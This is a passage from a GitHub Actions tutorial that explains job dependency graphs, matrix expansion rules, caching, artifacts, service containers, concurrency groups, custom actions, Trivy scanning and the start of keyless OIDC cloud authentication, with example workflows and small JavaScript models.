    Integration --> Security["Job: Container Vulnerability Scan"]
    Security --> DeployStaging["Job: Deploy to Staging"]
    DeployStaging --> DeployProd["Job: Gated Deploy to Production"]
```

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [{ uses: actions/checkout@v5 }, { run: npm run lint }]

  unit-test:
    runs-on: ubuntu-latest
    steps: [{ uses: actions/checkout@v5 }, { run: npm test }]

  build:
    needs: [lint, unit-test]
    runs-on: ubuntu-latest
    steps: [{ uses: actions/checkout@v5 }, { run: npm run build }]

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps: [{ run: ./deploy.sh }]
```

GitHub validates the graph before any job starts: a `needs:` naming an unknown job or forming a cycle makes the workflow file invalid. Then it runs jobs in waves as their dependencies finish. [`src/graph.js`](src/graph.js) reproduces both checks:

```js
export function planWaves(jobs) {
  const needsOf = (id) => {
    const n = jobs[id].needs ?? [];
    return Array.isArray(n) ? n : [n];
  };
  for (const id of Object.keys(jobs)) {
    for (const dep of needsOf(id)) {
      if (!(dep in jobs)) throw new Error(`Job "${id}" depends on unknown job "${dep}"`);
    }
  }
  const done = new Set();
  const waves = [];
  let remaining = Object.keys(jobs);
  while (remaining.length > 0) {
    const ready = remaining.filter((id) => needsOf(id).every((dep) => done.has(dep)));
    if (ready.length === 0) throw new Error(`Dependency cycle among: ${remaining.join(', ')}`);
    waves.push(ready);
    for (const id of ready) done.add(id);
    remaining = remaining.filter((id) => !done.has(id));
  }
  return waves;
}
```

```bash
$ node src/cli.js waves '{"lint":{},"test":{},"build":{"needs":["lint","test"]},"deploy":{"needs":"build"}}'
wave 1: lint, test
wave 2: build
wave 3: deploy
```

Waves are a model: GitHub starts each job as soon as its own dependencies finish, so a short branch of the graph does not wait for a long sibling.

**Skip propagation.** If a job fails, every job that depends on it, directly or transitively, is **skipped**, not failed, unless its `if:` contains a status function. `simulateRun` in the same file models this, including the rule that a job-level `failure()` looks at all ancestors:

| Downstream `if:` | Upstream failed | Upstream skipped | Upstream succeeded |
| --- | --- | --- | --- |
| (none) | skipped | skipped | runs |
| `failure()` | runs | runs if any ancestor failed | skipped |
| `always()` | runs | runs | runs |
| `!cancelled()` | runs | runs | runs |
| `needs.build.result == 'success' \|\| needs.build.result == 'skipped'` | skipped (implicit `success()`) | skipped | runs |

The last row is a classic bug: the implicit `success()` is added, so the condition never sees a skipped upstream. Write `if: ${{ !cancelled() && (needs.build.result == 'success' || needs.build.result == 'skipped') }}`.

### 3.2 Job Outputs and Conditional Jobs Across the Graph

The `needs` context gives each job its direct dependencies' `result` (`success`, `failure`, `cancelled`, `skipped`) and `outputs`. A job can only read jobs it lists in `needs:`, so a fan-in job lists everything it reads.

[`examples/workflows/04-pipeline-dag.yml`](examples/workflows/04-pipeline-dag.yml) passes the name of a packed tarball from `build` to `verify-package`, and reports any failure at the end:

```yaml
build:
  needs: [lint, test]
  runs-on: ubuntu-latest
  outputs:
    tarball: ${{ steps.pack.outputs.tarball }}
  steps:
    - uses: actions/checkout@v5
    - id: pack
      run: echo "tarball=$(npm pack --silent)" >> "$GITHUB_OUTPUT"
    - uses: actions/upload-artifact@v4
      with:
        name: package
        path: ${{ steps.pack.outputs.tarball }}
        if-no-files-found: error

verify-package:
  needs: build
  runs-on: ubuntu-latest
  steps:
    - uses: actions/download-artifact@v4
      with:
        name: package
    - env:
        TARBALL: ${{ needs.build.outputs.tarball }}
      run: tar -tzf "$TARBALL"

report-failure:
  needs: [verify-package]
  if: failure()
  runs-on: ubuntu-latest
  steps:
    - run: echo "::error::pipeline failed on $GITHUB_REF at $GITHUB_SHA"
```

| Element | What happens at runtime |
| --- | --- |
| `outputs.tarball` | Evaluated when `build` finishes; the string is stored with the run. |
| `needs.build.outputs.tarball` | Readable only by jobs that list `build` in `needs:`. |
| Artifact `package` | The file itself; the output only carries its name. |
| `report-failure` with `if: failure()` | Runs when `lint`, `test`, `build` or `verify-package` failed, because they are all ancestors. |

Matrix jobs share one set of outputs. When several matrix jobs set the same output, the last one to finish wins, and the order is not defined. To collect per-combination results, upload one artifact per combination (3.7) and merge them in a fan-in job.

### 3.3 Matrix Strategies: Expansion Rules, `include` and `exclude`

`strategy.matrix` creates one job per combination of values. GitHub expands it in a fixed order: cartesian product, then `exclude`, then `include`.

```mermaid
flowchart TD
    Dims["Dimensions: os x node"] --> Product["Cartesian product (3 x 2 = 6)"]
    Product --> Exclude["exclude: drop macos-latest + 22 (5 left)"]
    Exclude --> Include{"for each include entry"}
    Include -->|"overwrites no original value"| Merge["merge into every matching combination"]
    Include -->|"would overwrite an original value"| Append["append as a new combination"]
    Merge --> Limit{"256 jobs or fewer?"}
    Append --> Limit
    Limit -- yes --> Jobs["Jobs queued"]
    Limit -- no --> Error["Workflow error"]
```

This is [`examples/workflows/05-matrix.yml`](examples/workflows/05-matrix.yml):

```yaml
jobs:
  test:
    name: test (${{ matrix.os }}, node ${{ matrix.node }})
    runs-on: ${{ matrix.os }}
    timeout-minutes: 15
    continue-on-error: ${{ matrix.experimental == true }}
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [22, 24]
        exclude:
          - os: macos-latest
            node: 22
        include:
          - node: 24
            coverage: true
          - os: ubuntu-24.04-arm
            node: 24
          - os: ubuntu-latest
            node: 25
            experimental: true
```

The `include` rules are where people get surprised:

1. An entry is merged into **every** original combination where none of its keys would overwrite an **original** matrix value. `{node: 24, coverage: true}` merges into all three node-24 jobs.
2. Values added by an earlier `include` may be overwritten by a later one.
3. An entry that fits no original combination becomes a new job: `{os: ubuntu-24.04-arm, node: 24}` and `{os: ubuntu-latest, node: 25}`.
4. Later entries never merge into the standalone jobs created by rule 3.
5. `exclude` runs first, so an `include` can bring back a combination that was excluded.

[`src/matrix.js`](src/matrix.js) implements exactly these rules:

```js
const extra = [];
for (const entry of include) {
  const targets = base.filter((combo) =>
    Object.entries(entry).every(
      ([k, v]) => !dimensionKeys.includes(k) || same(combo[k], v),
    ),
  );
  if (targets.length > 0) {
    for (const combo of targets) Object.assign(combo, entry);
  } else {
    extra.push({ ...entry });
  }
}
```

| Line | Rule it encodes |
| --- | --- |
| `base` | The original combinations after `exclude`. `extra` is kept separate (rule 4). |
| `!dimensionKeys.includes(k) \|\| same(combo[k], v)` | Keys that are not original dimensions never block a merge, so added values can be overwritten (rules 1 and 2). |
| `Object.assign(combo, entry)` | Merge into every target, not just the first. |
| `extra.push` | No target: a new job (rule 3). |

Check your own matrix before you push:

```bash
$ node src/cli.js matrix '{"os":["ubuntu-latest","windows-latest","macos-latest"],"node":[22,24],"exclude":[{"os":"macos-latest","node":22}],"include":[{"node":24,"coverage":true},{"os":"ubuntu-24.04-arm","node":24},{"os":"ubuntu-latest","node":25,"experimental":true}]}'
job (ubuntu-latest, 22)
job (ubuntu-latest, 24, true)
job (windows-latest, 22)
job (windows-latest, 24, true)
job (macos-latest, 24, true)
job (ubuntu-24.04-arm, 24)
job (ubuntu-latest, 25, true)
```

A matrix can produce at most **256 jobs per workflow run**. Values can be objects, which is useful when one dimension carries several settings:

```yaml
strategy:
  matrix:
    target:
      - { os: ubuntu-24.04, triple: x86_64-unknown-linux-gnu }
      - { os: ubuntu-24.04-arm, triple: aarch64-unknown-linux-gnu }
      - { os: macos-15, triple: aarch64-apple-darwin }
runs-on: ${{ matrix.target.os }}
```

### 3.4 Dynamic Matrices with `fromJSON`

When the set of jobs depends on the commit (changed services in a monorepo, supported versions read from a file), compute the matrix in one job and feed it to the next. This repository's own [`ci.yml`](.github/workflows/ci.yml) does it with its JavaScript action:

```yaml
plan:
  runs-on: ubuntu-latest
  outputs:
    include: ${{ steps.plan.outputs.include }}
  steps:
    - uses: actions/checkout@v5
    - id: plan
      uses: ./actions/matrix-plan
      with:
        matrix: |
          {
            "os": ["ubuntu-latest", "windows-latest"],
            "node": [22, 24],
            "exclude": [{ "os": "windows-latest", "node": 22 }],
            "include": [{ "node": 24, "coverage": true }]
          }

fan-out:
  needs: plan
  runs-on: ${{ matrix.os }}
  strategy:
    matrix:
      include: ${{ fromJSON(needs.plan.outputs.include) }}
```

```mermaid
sequenceDiagram
    participant Plan as plan job
    participant Action as matrix-plan (node24)
    participant Svc as Actions service
    participant Jobs as fan-out jobs
    Plan->>Action: INPUT_MATRIX = JSON text
    Action->>Action: expandMatrix() from src/matrix.js
    Action->>Plan: append include=[...] and count=3 to GITHUB_OUTPUT
    Plan->>Svc: job output include
    Svc->>Svc: fromJSON(), build one job per array element
    Svc->>Jobs: queue fan-out (ubuntu-latest, 22), (ubuntu-latest, 24), (windows-latest, 24)
```

The same pattern without a custom action, for changed directories in a monorepo:

```yaml
detect:
  runs-on: ubuntu-latest
  outputs:
    services: ${{ steps.changed.outputs.services }}
  steps:
    - uses: actions/checkout@v5
      with:
        fetch-depth: 0
    - id: changed
      env:
        BASE: ${{ github.event.pull_request.base.sha || github.event.before }}
      run: |
        services=$(git diff --name-only "$BASE" "$GITHUB_SHA" -- services/ \
          | cut -d/ -f2 | sort -u | jq -R . | jq -cs .)
        echo "services=$services" >> "$GITHUB_OUTPUT"

build:
  needs: detect
  if: needs.detect.outputs.services != '[]'
  runs-on: ubuntu-latest
  strategy:
    matrix:
      service: ${{ fromJSON(needs.detect.outputs.services) }}
  steps:
    - run: echo "building ${{ matrix.service }}"
```

Guard against the empty case: a matrix with an empty array is an error ("Matrix vector 'service' does not contain any values"), hence the `if:` on the consuming job.

### 3.5 `fail-fast`, `max-parallel`, `continue-on-error` and Timeouts

| Matrix Property | Purpose |
| :--- | :--- |
| `fail-fast: true` (default) | When one matrix job fails, GitHub cancels the in-progress and queued siblings. |
| `fail-fast: false` | Every combination finishes, so you see the full platform picture. |
| `max-parallel` | Caps concurrently running jobs of this matrix, for rate-limited APIs or shared test databases. |
| `include` | Adds attributes to combinations, or new combinations. |
| `exclude` | Removes unsupported combinations. |

`continue-on-error` exists at two levels with different meanings:

| Level | Effect |
| --- | --- |
| Step | A failing step is marked `outcome: failure` but `conclusion: success`; the job continues and can be green. |
| Job | A failing job does not fail the workflow run. With a matrix expression, `continue-on-error: ${{ matrix.experimental == true }}`, only the experimental combinations are allowed to fail, and they do not trigger `fail-fast` cancellation. |

Timeouts also exist at two levels: `jobs.<id>.timeout-minutes` (default 360) and `steps[*].timeout-minutes`. A job on a GitHub-hosted runner can never run longer than 6 hours; on a self-hosted runner the limit is 5 days. A whole workflow run, including time waiting for approvals, cannot exceed 35 days.

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
      - name: Browser tests
        timeout-minutes: 20
        run: npm run test:e2e
```

### 3.6 Caching with `actions/cache`: Keys, Scope and Eviction

Re-downloading dependencies on every run wastes minutes. `actions/cache` stores a directory under a key and restores it in later runs:

```mermaid
flowchart TD
    Start["Job starts"] --> Exact{"Exact key match in a readable scope?"}
    Exact -- yes --> Hit["Restore, cache-hit = true"]
    Exact -- no --> Prefix{"restore-keys prefix match?"}
    Prefix -- yes --> Partial["Restore newest match, cache-hit = false"]
    Prefix -- no --> Miss["Nothing restored"]
    Hit --> Build["Install and build"]
    Partial --> Build
    Miss --> Build
    Build --> Post{"Post step: key already exists?"}
    Post -- no --> Save["Save new entry under key"]
    Post -- yes --> NoSave["Skip save (entries are immutable)"]
```

The explicit form, from [`examples/workflows/06-cache.yml`](examples/workflows/06-cache.yml):

```yaml
- name: Restore or create the npm download cache
  id: npm-cache
  uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-${{ runner.arch }}-
- run: npm ci --prefer-offline --no-audit
```

For the common package managers, the `setup-*` actions do the same with one line (`cache: npm`, `cache: pip`, `cache: gradle`, Go caches by default in `setup-go`). Use explicit `actions/cache` for anything else: build outputs, compiler caches, Playwright browsers.

Five rules explain nearly every "why did the cache miss?" question. [`src/cache.js`](src/cache.js) encodes them and [`test/pipeline.test.js`](test/pipeline.test.js) proves each one:

1. **`cache-hit` is `true` only for an exact primary-key match.** A `restore-keys` match restores an older entry and sets `cache-hit` to `false`, so the next step still runs `npm ci`.
2. **Scope is per branch.** A run can read caches created on its own ref, then the PR's base branch, then the default branch. Feature branches cannot read each other's caches. Seed the default branch to give every PR a warm cache.
3. **Entries are immutable.** If the key already exists, the post step skips saving, so a key that never changes never gets fresher. Put a content hash in the key.
4. **`hashFiles` returns `''` when nothing matches.** A wrong path turns `npm-Linux-X64-${{ hashFiles('pakage-lock.json') }}` into `npm-Linux-X64-`, a key shared by every commit.
5. **Eviction.** Entries not accessed for 7 days are removed, and when a repository passes its cache storage limit (10 GB by default) the least recently used entries go first.

```js
export function restoreCache(entries, request) {
  const { key, restoreKeys = [] } = request;
  for (const scope of readableScopes(request)) {
    const inScope = entries.filter((e) => e.scope === scope);
    const exact = inScope.find((e) => e.key === key);
    if (exact) return { cacheHit: true, matchedKey: exact.key, scope };
    for (const prefix of restoreKeys) {
      const newest = inScope
        .filter((e) => e.key.startsWith(prefix))
        .sort((a, b) => b.createdAt - a.createdAt)[0];
      if (newest) return { cacheHit: false, matchedKey: newest.key, scope };
    }
  }
  return { cacheHit: false, matchedKey: null, scope: null };
}
```

When you need to save even if the job fails, or save from a different step, split the action:

```yaml
- uses: actions/cache/restore@v4
  id: restore
  with:
    path: .turbo
    key: turbo-${{ runner.os }}-${{ github.sha }}
    restore-keys: turbo-${{ runner.os }}-
- run: npx turbo run build
- uses: actions/cache/save@v4
  if: ${{ !cancelled() }}
  with:
    path: .turbo
    key: ${{ steps.restore.outputs.cache-primary-key }}
```

Manage caches from the CLI:

```bash
gh cache list --sort size_in_bytes --limit 20
gh cache delete npm-Linux-X64-0f3c...      # one key
gh cache delete --all                     # everything in the repo
```

### 3.7 Artifacts: Passing Files Between Jobs and Keeping Results

Artifacts are files a job uploads to the run. Use them to pass build output to later jobs and to keep reports for people.

| | Cache | Artifact |
| --- | --- | --- |
| Purpose | Speed up future runs | Hand files to later jobs, or keep results |
| Lifetime | Until evicted (7 days unused, or size limit) | Retention period: 90 days by default, `retention-days: 1-90` (org limits can lower it) |
| Visibility | Same repo, by branch scope | Same run (and downloadable from the UI, API, `gh run download`) |
| Mutability | Immutable per key | Immutable per name (v4); names unique per run |
| Typical content | `~/.npm`, `~/.cache/pip`, compiler caches | `dist/`, test reports, coverage, SBOMs |

```mermaid
sequenceDiagram
    participant T1 as test (ubuntu, 22)
    participant T2 as test (windows, 24)
    participant Store as Run artifact storage
    participant M as merge-reports
    T1->>Store: upload "report-ubuntu-latest-22"
    T2->>Store: upload "report-windows-latest-24"
    Note over Store: v4: one artifact per name, no appends
    M->>Store: download pattern "report-*", merge-multiple: true
    Store-->>M: reports/report-ubuntu-latest-22.xml, reports/report-windows-latest-24.xml
```

```yaml
- if: ${{ !cancelled() }}
  uses: actions/upload-artifact@v4
  with:
    name: report-${{ matrix.os }}-${{ matrix.node }}
    path: report-*.xml
    retention-days: 3
    if-no-files-found: error
# fan-in job
- uses: actions/download-artifact@v4
  with:
    pattern: report-*
    merge-multiple: true
    path: reports
```

| Input | Why set it |
| --- | --- |
| `if: ${{ !cancelled() }}` on the upload | Reports matter most when tests fail. |
| Unique `name` per matrix job | v4 rejects a second upload with the same name in a run. |
| `retention-days` | PR reports rarely need 90 days; shorter retention cuts storage cost. |
| `if-no-files-found: error` | A typo in `path` fails loudly instead of uploading nothing. |
| `pattern` + `merge-multiple` | Collects many artifacts into one directory. |

### 3.8 Service Containers and Job Containers

`services:` starts Docker containers next to the job, such as a database for integration tests. Service containers work on Linux runners only. This is [`examples/workflows/07-services.yml`](examples/workflows/07-services.yml):

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:17-alpine
        env:
          POSTGRES_PASSWORD: ci-only-password
          POSTGRES_DB: app_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 3s
          --health-retries 10
    env:
      DATABASE_URL: postgres://postgres:ci-only-password@localhost:5432/app_test
    steps:
      - run: psql "$DATABASE_URL" -c 'select version();'
```

How steps reach the service depends on where the job runs:

| Job runs | Address of the service | Needs `ports:` |
| --- | --- | --- |
| Directly on the runner VM (no `container:`) | `localhost:<mapped port>` | Yes |
| In a job container (`container: node:24`) | The service's key as hostname, `postgres:5432` | No, both are on the same Docker network |

```yaml
jobs:
  in-container:
    runs-on: ubuntu-latest
    container: node:24-bookworm
    services:
      redis:
        image: redis:8-alpine
    steps:
      - run: node -e "require('net').connect(6379, 'redis').on('connect', () => { console.log('ok'); process.exit(0) })"
```

The `options:` health check matters: without it the first step can start before the database accepts connections and fail with `connection refused`.

### 3.9 Concurrency Groups and Cancel-in-Progress

A concurrency group allows **at most one running and one pending** run or job with the same group name. What happens to the rest depends on `cancel-in-progress`:

```mermaid
stateDiagram-v2
    [*] --> Running: group empty
    [*] --> Pending: group busy, cancel-in-progress false
    Pending --> Cancelled: a newer run arrives (replaces pending)
    Running --> Cancelled: newer run arrives and cancel-in-progress is true
    Pending --> Running: running run completes
    Running --> Completed
    Completed --> [*]
    Cancelled --> [*]
```

[`src/concurrency.js`](src/concurrency.js) models the queue; its test shows that, without `cancel-in-progress`, a third run cancels the second (pending) run rather than queuing behind it:

```text
run-1: started
run-2: pending
run-2: cancelled (pending replaced by run-3)
run-3: pending
run-1: completed
run-3: started
```

The pattern from [`examples/workflows/08-concurrency.yml`](examples/workflows/08-concurrency.yml) combines a workflow-level group that cancels superseded PR runs with a job-level group that serialises deploys:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    needs: test
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-staging
      cancel-in-progress: false
    steps:
      - run: echo "deploying $GITHUB_SHA to staging"
```

| Configuration | Effect |
| :--- | :--- |
| `group` with `github.workflow` | Different workflows on the same branch do not cancel each other. |
| `github.head_ref \|\| github.ref` | PRs group by their source branch; pushes by their ref. |
| `cancel-in-progress: ${{ github.event_name == 'pull_request' }}` | Old PR runs are cancelled; runs on `main` finish so every commit on `main` gets a result. |
| Job-level `group: deploy-staging` | Shared across workflows: two deploys to staging never overlap, whatever triggered them. |
| `cancel-in-progress: false` on deploys | A half-finished deploy is never killed. Remember the newest pending deploy replaces older pending ones, which is usually what you want. |

### 3.10 Pitfalls

| Pitfall | Symptom | Fix |
| --- | --- | --- |
| Downstream job condition without a status function | Job is skipped when an optional upstream was skipped | `if: ${{ !cancelled() && needs.x.result != 'failure' }}` |
| Reading a job that is not in `needs:` | Expression evaluates to empty | List every job you read in `needs:`. |
| Several matrix jobs set the same output | Output value changes between runs | One artifact per combination, or a single non-matrix job sets the output. |
| `include` entry expected to add a new job but it merged | Fewer jobs than expected, extra keys on existing jobs | Read the include rules (3.3); run `node src/cli.js matrix` on your matrix. |
| Empty dynamic matrix | `Matrix vector 'x' does not contain any values` | Guard the consuming job with `if: needs.plan.outputs.list != '[]'`. |
| Cache key without a content hash | Old dependencies forever; save step logs that the key already exists | Include `hashFiles(...)` of the lockfile in the key. |
| Misspelled lockfile path in `hashFiles` | Same key on every commit | Check the key in the logs; it ends with `-` when nothing matched. |
| Expecting a feature branch to read another feature branch's cache | Cold cache on every new PR | Run the workflow on `main` so its caches are readable everywhere. |
| Same artifact name from every matrix job | `Conflict: an artifact with this name already exists on the workflow run` | Add matrix values to the name; merge with `pattern` + `merge-multiple`. |
| Service without a health check | `connection refused` in the first test | Add `--health-cmd` options. |
| `cancel-in-progress: true` on a deploy job | Half-applied deploy when a new commit lands | Serialise deploys with `cancel-in-progress: false`. |

### 3.11 Best Practices

- **Draw the graph first**: decide which jobs gate others; parallel jobs finish sooner and fail independently.
- **Build once, test the artifact**: later jobs download the same build instead of rebuilding it with possibly different inputs.
- **Use `fail-fast: false` for platform matrices**: you want every platform's result in one run.
- **Keep matrices small and meaningful**: test the supported edges (oldest and newest versions), not every value in between.
- **Plan dynamic matrices in a dedicated job**: the plan is visible in its log and summary, and it can be unit-tested like `src/matrix.js`.
- **Key caches on lockfile hashes plus OS and architecture**: an arm64 cache restored on x64 breaks native modules.
- **Prefer the `setup-*` actions' built-in caching**: it already uses the right paths and keys.
- **Set `retention-days` on every upload**: storage is billed and most artifacts are useful for days, not months.
- **Use a job-level concurrency group per deployment target**: it works across workflows and keeps deploys ordered.

### 3.12 Hands-on Exercise

Build a pipeline that:

1. Plans a matrix in a `plan` job with the repository's `./actions/matrix-plan` action: `os` = `ubuntu-latest`, `windows-latest`; `node` = 22, 24; excluding Windows on 22.
2. Runs the tests on every planned combination with `fail-fast: false`, the npm cache, and a JUnit report uploaded as `report-<os>-<node>`, even when tests fail.
3. Merges all reports into one directory in a fan-in job that runs unless the run is cancelled.
4. Cancels superseded runs on pull requests but not on `main`.

Expected output: three `test` jobs named `test (ubuntu-latest, 22)`, `test (ubuntu-latest, 24)` and `test (windows-latest, 24)`; a `merge-reports` job whose log lists three XML files; and, when you push twice quickly to a PR branch, the first run shows as cancelled.

Solution: [`examples/workflows/s3-exercise.yml`](examples/workflows/s3-exercise.yml).

[Back to top ⤴️](#-table-of-contents)

---
## 4. Stage 4: Custom Actions & Reusable Components

Once several repositories copy the same steps, it is time to package them. This stage covers the three kinds of actions, reusable workflows, API automation with `actions/github-script`, and container scanning. Prerequisite: Stages 1-3.

### 4.1 Composite Actions: Architecture & Implementation

Composite actions bundle several steps, both `run:` commands and other actions, into one reusable step. They can live in the same repository (`uses: ./path`) or in a shared repository (`uses: org/actions/setup@v1`).

#### Directory Structure

```text
.github/actions/setup-environment/
├── action.yml
└── README.md
```

#### `action.yml` Specification

```yaml
name: 'Node & Cache Setup'
description: 'Standardises Node runtime initialisation and dependency caching'
inputs:
  node-version:
    description: 'Node.js runtime version to initialise'
    required: false
    default: '24'
outputs:
  cache-hit:
    description: 'Whether dependencies were restored from an exact cache match'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node
      uses: actions/setup-node@v5
      with:
        node-version: ${{ inputs.node-version }}

    - name: Cache Dependencies
      id: cache
      uses: actions/cache@v4
      with:
        path: ~/.npm
        key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

    - name: Install Dependencies
      shell: bash
      run: npm ci
```

| Directive | Purpose |
| :--- | :--- |
| `using: 'composite'` | The runner expands the steps inline into the calling job. |
| `shell: bash` | Required on every `run:` step inside a composite action; it does not inherit `defaults.run`. |
| `inputs` / `outputs` | Declares parameters and exported values; outputs map to inner step outputs with `value:`. |

This repository's own composite action, [`actions/node-ci/action.yml`](actions/node-ci/action.yml), runs the test job in [`ci.yml`](.github/workflows/ci.yml).

### 4.2 Docker Container Actions: Isolated Polyglot Runtimes

Docker container actions run inside a Linux container image, which suits tools that are hard to install on the runner:

```mermaid
flowchart LR
    Job["Runner job VM (Linux)"] --> RunDocker["Docker daemon (docker run)"]
    RunDocker --> Container["Action container (any language or toolchain)"]
    Container --> Mount["Workspace bind-mounted at /github/workspace"]
```

```yaml
# action.yml for a Docker action
name: 'Deep Security Audit'
description: 'Runs compliance checks in a container'
inputs:
  severity_threshold:
    description: 'Lowest severity that fails the step'
    default: 'high'
runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.severity_threshold }}
```

Docker actions run only on Linux runners, and the image is built (or pulled) at the start of every job that uses the action, so prefer a prebuilt `image: docker://ghcr.io/org/tool:1.2.3` for anything large.

### 4.3 Custom JavaScript Actions with `@actions/core`

For logic that needs API calls, file parsing or complex branching, write a JavaScript action. The runner starts it with its bundled Node (`runs.using: node24`), so it starts fast and works on Linux, Windows and macOS runners. GitHub's toolkit packages wrap the runner protocol:

```typescript
// src/main.ts, bundled to dist/index.js with a tool such as ncc or esbuild
import * as core from '@actions/core';
import * as github from '@actions/github';

async function run(): Promise<void> {
  try {
    const token = core.getInput('github-token', { required: true });
    const prNumber = github.context.payload.pull_request?.number;

    if (!prNumber) {
      core.info('Not running in a pull request context. Skipping.');
      return;
    }

    const octokit = github.getOctokit(token);
    await octokit.rest.issues.createComment({
      ...github.context.repo,
      issue_number: prNumber,
      body: 'Quality gate passed: benchmark within 2% of main.',
    });

    core.setOutput('passed', 'true');
  } catch (error) {
    if (error instanceof Error) core.setFailed(error.message);
  }
}

run();
```

The starter's [`actions/matrix-plan`](actions/matrix-plan) action does the same job without dependencies, using [`src/toolkit.js`](src/toolkit.js), so you can see what `core.getInput` (read `INPUT_<NAME>`) and `core.setOutput` (append to `$GITHUB_OUTPUT`) actually do.

### 4.4 Reusable Workflows (`workflow_call`) vs Starter Workflows

Reusable workflows give platform teams central control: they define golden pipelines that application teams call as a single job.

```mermaid
flowchart TD
    RepoApp["Application repo: .github/workflows/deploy.yml"] -->|"uses: org/workflows/.github/workflows/golden-deploy.yml@v2"| RepoCentral["Central repo: org/workflows"]
    RepoCentral --> Steps["Security scan, container build, Helm deploy"]
```

```yaml
# Caller workflow (app-repo/.github/workflows/ci.yml)
jobs:
  call-golden-pipeline:
    uses: acme-corp/central-workflows/.github/workflows/golden-build.yml@v1.4.0
    with:
      environment: 'production'
    secrets: inherit
```

Starter workflows are templates copied into a repository when someone clicks "Configure" in the Actions tab; after the copy, changes in the template do not reach the repository. Reusable workflows are referenced, so a new tag reaches every caller that moves to it.

### 4.5 Orchestrating GitHub APIs with `actions/github-script`

`actions/github-script` runs inline JavaScript with an authenticated Octokit client, which avoids building a separate action for small automations.

```mermaid
flowchart LR
    Step["actions/github-script@v7"] --> PreAuth["Pre-authenticated Octokit client"]
    PreAuth --> Context["Context payload (PR, issue, commit)"]
    Context --> API["GitHub REST / GraphQL"]
    API --> Action1["Post PR comments"]
    API --> Action2["Apply labels"]
    API --> Action3["Enable auto-merge"]
```

#### Example: Auto-Triaging Pull Requests by Size

```yaml
- name: Auto-Triage Pull Request
  uses: actions/github-script@v7
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    script: |
      const { data: pr } = await github.rest.pulls.get({
        owner: context.repo.owner,
        repo: context.repo.repo,
        pull_number: context.payload.pull_request.number
      });

      const changedFiles = pr.changed_files;
      const labels = ['automated-triage'];

      if (changedFiles > 50) {
        labels.push('size/large');
      } else if (changedFiles > 10) {
        labels.push('size/medium');
      } else {
        labels.push('size/small');
      }

      await github.rest.issues.addLabels({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.payload.pull_request.number,
        labels: labels
      });

      core.info(`Applied labels: ${labels.join(', ')}`);
```

| Object / Variable | Technical Role |
| :--- | :--- |
| `github` | Authenticated Octokit REST and GraphQL client |
| `context` | The run context (`repo`, `payload`, `actor`, `eventName`) |
| `core` | `@actions/core`: logging, outputs, masking, `setFailed` |
| `exec` | `@actions/exec` for running command-line tools |

### 4.6 Container Vulnerability Scanning with Trivy & SARIF Upload

Scan images for known CVEs and report findings to the repository's **Security → Code scanning** page via SARIF:

```mermaid
sequenceDiagram
    autonumber
    participant CI as GitHub runner
    participant Docker as Docker daemon
    participant Trivy as Trivy scanner
    participant Sec as Code scanning (SARIF)

    CI->>Docker: docker build -t my-app:SHA .
    CI->>Trivy: Scan the image (CRITICAL, HIGH)
    Trivy-->>CI: trivy-results.sarif
    CI->>Sec: github/codeql-action/upload-sarif
    Sec-->>CI: Alerts on the Security tab and the PR
```

```yaml
permissions:
  contents: read
  security-events: write

steps:
  - uses: actions/checkout@v5

  - name: Build local container image
    run: docker build -t production-app:${{ github.sha }} .

  - name: Run Trivy vulnerability scan
    uses: aquasecurity/trivy-action@0.28.0 # pin a release by SHA in production
    with:
      image-ref: 'production-app:${{ github.sha }}'
      format: 'sarif'
      output: 'trivy-results.sarif'
      severity: 'CRITICAL,HIGH'

  - name: Upload scan results to GitHub Security
    uses: github/codeql-action/upload-sarif@v3
    if: ${{ !cancelled() }}
    with:
      sarif_file: 'trivy-results.sarif'
```

| Configuration Flag | Security Purpose |
| :--- | :--- |
| `format: 'sarif'` | Static Analysis Results Interchange Format (OASIS standard), which code scanning reads |
| `severity: 'CRITICAL,HIGH'` | Filters low-impact findings to avoid alert fatigue |
| `if: ${{ !cancelled() }}` | Uploads the report even when the scan step fails the job |

[Back to top ⤴️](#-table-of-contents)

---

## 5. Stage 5: Security, Secrets & Cloud OIDC Federation

Workflows hold the keys to production, so they are a prime target. This stage removes long-lived cloud keys, gates deployments, and closes the injection and supply-chain holes. Prerequisite: Stages 1-4.

### 5.1 OpenID Connect (OIDC): Keyless Cloud Authentication to AWS, Azure and Google Cloud

Storing long-lived cloud credentials (`AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`) in GitHub Secrets means a leak is valid until someone rotates it. **OIDC** replaces them: the job asks GitHub for a short-lived signed JWT, and the cloud exchanges it for temporary credentials after checking the claims against a trust policy.

```mermaid
sequenceDiagram
    autonumber
    participant Runner as GitHub Actions runner
    participant OIDC as GitHub OIDC provider
    participant AWS as AWS STS
    participant S3 as Amazon S3

    Runner->>OIDC: Request token (needs permissions id-token: write)
    OIDC-->>Runner: Signed JWT (iss: https://token.actions.githubusercontent.com)
    Runner->>AWS: AssumeRoleWithWebIdentity(JWT, RoleArn)
    AWS->>AWS: Verify signature and claims (aud, sub)
    AWS-->>Runner: Temporary credentials (1 hour by default)
    Runner->>S3: aws s3 sync
    Note over Runner,S3: No stored cloud keys
```

#### AWS OIDC Workflow Configuration

```yaml
name: Keyless AWS Deployment

permissions:
  id-token: write # request the OIDC JWT
  contents: read  # check out code

jobs:
  deploy-aws:
